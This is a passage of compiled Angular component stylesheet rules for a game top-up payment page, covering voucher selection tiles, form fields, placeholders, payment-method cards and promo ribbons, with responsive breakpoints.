        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] input[type=number][_ngcontent-gtc-c19]::-webkit-inner-spin-button,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] input[type=number][_ngcontent-gtc-c19]::-webkit-outer-spin-button {
            -webkit-appearance: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-group[_ngcontent-gtc-c19] {
            margin-bottom: 22px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-group[_ngcontent-gtc-c19] .error-label[_ngcontent-gtc-c19] {
            margin-top: 10px;
            margin-bottom: 15px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-group[_ngcontent-gtc-c19] .select-disabled[_ngcontent-gtc-c19] {
            cursor: no-drop
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-group[_ngcontent-gtc-c19] .select-disabled[_ngcontent-gtc-c19] .form-arrow[_ngcontent-gtc-c19]:after {
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-top: 5px solid #69707e;
            content: "";
            position: absolute;
            margin-top: -30px;
            right: 40px
        }

        @media (max-width:767px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .one-line[_ngcontent-gtc-c19] .col-xs-8[_ngcontent-gtc-c19] {
                padding-right: 8px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .one-line[_ngcontent-gtc-c19] .col-xs-4[_ngcontent-gtc-c19] {
                padding-left: 8px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-group[_ngcontent-gtc-c19] {
                margin-bottom: 20px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-group[_ngcontent-gtc-c19] .error-label[_ngcontent-gtc-c19] {
                margin-bottom: 15px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-group[_ngcontent-gtc-c19] .select-disabled[_ngcontent-gtc-c19] .form-arrow[_ngcontent-gtc-c19]:after {
                margin-top: -35px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control[_ngcontent-gtc-c19] {
            color: #fff;
            outline: 0;
            box-shadow: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control[_ngcontent-gtc-c19]:focus {
            outline: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19] {
            border-radius: 4px;
            border: 1px solid #b4b4c0;
            padding: 10px 18px;
            font-size: 16px;
            color: #fff;
            background-color: #323339;
            height: 55px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]:-ms-input-placeholder,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]::-ms-input-placeholder {
            font-size: 16px;
            color: #4f545f;
            font-family: Montserrat;
            text-transform: capitalize
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]:-ms-input-placeholder,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]::placeholder {
            font-size: 16px;
            color: #4f545f;
            font-family: Montserrat;
            text-transform: capitalize
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19] {
                height: 50px;
                font-size: 16px;
                margin-bottom: 10px;
                padding: 10px 15px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]:-ms-input-placeholder,
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]::-ms-input-placeholder {
                font-size: 14px !important
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]:-ms-input-placeholder,
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]::placeholder {
                font-size: 14px !important
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]:-ms-input-placeholder {
            font-size: 16px;
            color: #4f545f;
            font-family: Montserrat;
            text-transform: capitalize
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]:-ms-input-placeholder {
                font-size: 12px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]::-ms-input-placeholder {
            font-size: 16px;
            color: #4f545f;
            font-family: Montserrat;
            text-transform: capitalize
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] {
            padding: 0;
            height: auto;
            border: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-form-field-wrapper {
            padding: 0;
            margin: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-form-field-outline {
            color: #b4b4c0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-form-field-outline-end,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-form-field-outline-gap,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-form-field-outline-start {
            border-width: 1px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-select-arrow-wrapper .mat-select-arrow {
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-select-value-text span,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .selectLabel {
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.select-formControl[_ngcontent-gtc-c19] .mat-form-field-flex {
            padding-left: 20px;
            padding-right: 20px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control[_ngcontent-gtc-c19] .mat-option[_ngcontent-gtc-c19] {
            background-color: #595a61
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control[_ngcontent-gtc-c19] .mat-option[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            color: #fff;
            font-family: Montserrat
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control[_ngcontent-gtc-c19] .mat-option.mat-active[_ngcontent-gtc-c19] {
            background-color: #84858e
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .group-item[_ngcontent-gtc-c19] {
            margin-top: 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19] {
            cursor: pointer;
            display: inline-block;
            float: left;
            margin-right: 13px;
            width: calc((100% / 4) - (10px));
            border: 1px solid rgba(106, 112, 125, .49);
            border-radius: 4px;
            margin-bottom: 15px;
            position: relative;
            min-height: 48px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19]:hover {
            background-color: #2b2e34
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19]:nth-child(4n+1) {
            clear: left
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19]:nth-child(4n+4) {
            margin-right: 0
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .form-control.border-formControl[_ngcontent-gtc-c19]::-ms-input-placeholder {
                font-size: 12px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19] {
                width: calc((100% / 2) - (10px / 2));
                margin-right: 10px;
                margin-bottom: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19]:nth-child(4n+4) {
                margin-right: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19]:nth-child(2n+2) {
                margin-right: 0
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            text-align: center;
            text-transform: capitalize;
            font-size: 12px;
            padding: 14px 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item.selected[_ngcontent-gtc-c19] {
            background-color: #6a707d;
            border: 1px solid rgba(106, 112, 125, .49);
            box-shadow: 0 2px 8px 0 rgba(0, 0, 0, .5)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19] input[_ngcontent-gtc-c19] {
            position: absolute;
            top: 0;
            bottom: 0;
            margin: auto;
            left: 0;
            right: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item.promo[_ngcontent-gtc-c19] {
            border: 2px solid #6a707d
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19] .price-tag[_ngcontent-gtc-c19] {
            border-top-right-radius: 3px;
            border-bottom-left-radius: 4px;
            position: absolute;
            width: 18px;
            height: 18px;
            top: -1px;
            right: -1px;
            background-color: #6a707d;
            margin: auto;
            text-align: center
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item[_ngcontent-gtc-c19] .price-tag[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            width: 12px;
            margin: 0 0 4px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19] {
            display: inline-block;
            float: left;
            margin-right: 13px;
            width: calc((100% / 4) - (10px));
            border: 1px solid #3a3d45;
            border-radius: 4px;
            margin-bottom: 15px;
            position: relative;
            color: #3c4049
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19]:nth-child(4n+1) {
            clear: left
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19]:nth-child(4n+4) {
            margin-right: 0
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19] {
                width: calc((100% / 2) - (10px / 2));
                margin-right: 10px;
                margin-bottom: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19]:nth-child(4n+4) {
                margin-right: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19]:nth-child(2n+2) {
                margin-right: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-box-paymentMethod[_ngcontent-gtc-c19] {
                width: calc((100% / 2) - (5px));
                float: left;
                margin-right: 10px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            text-align: center;
            text-transform: capitalize;
            font-size: 12px;
            padding: 14px 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19] input[_ngcontent-gtc-c19] {
            position: absolute;
            top: 0;
            bottom: 0;
            margin: auto;
            left: 0;
            right: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: no-drop
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19] .price-tag[_ngcontent-gtc-c19] {
            border-top-right-radius: 3px;
            border-bottom-left-radius: 4px;
            position: absolute;
            width: 18px;
            height: 18px;
            top: -1px;
            right: -1px;
            background-color: #6a707d;
            margin: auto;
            text-align: center
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-item-disabled[_ngcontent-gtc-c19] .price-tag[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            width: 12px;
            margin: 0 0 4px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-box-paymentMethod[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] {
            border-radius: 3px;
            padding: 40px 18px 25px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-box-paymentMethod[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            margin-top: 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card[_ngcontent-gtc-c19] {
            padding: 20px 15px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__reebon[_ngcontent-gtc-c19] {
            position: absolute;
            top: 0;
            right: 0;
            padding: 0 7px;
            border-top-right-radius: 6px;
            border-bottom-left-radius: 3px;
            display: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__reebon[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            font-size: 12px;
            line-height: 1.5;
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__reebon.foryou[_ngcontent-gtc-c19] {
            display: block;
            background-image: linear-gradient(106deg, #41c2ff, #2857c3)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__reebon.bonus[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__reebon.promo[_ngcontent-gtc-c19] {
            display: block;
            background-image: linear-gradient(107deg, #e11a1a, #4b1414)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__box[_ngcontent-gtc-c19] {
            background-color: #2b2e34;
            border-radius: 6px;
            border: 1px solid rgba(106, 112, 125, .49);
            padding: 15px 15px 5px;
            position: relative;
            margin: 0 0 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__first--section[_ngcontent-gtc-c19] {
            cursor: pointer;
            padding-bottom: 7px
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-box-paymentMethod[_ngcontent-gtc-c19]:nth-child(2n+2) {
                margin-right: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .wrapper-box-paymentMethod[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] {
                padding: 30px 18px 20px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__first--section[_ngcontent-gtc-c19] {
                margin: 0
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__first--section[_ngcontent-gtc-c19]:hover+.payment-card__last--section[_ngcontent-gtc-c19] {
            position: relative;
            height: 50px;
            visibility: visible;
            opacity: 1;
            border-top: 1px solid rgba(106, 112, 125, .7);
            padding-top: 11px;
            padding-bottom: 5px
        }

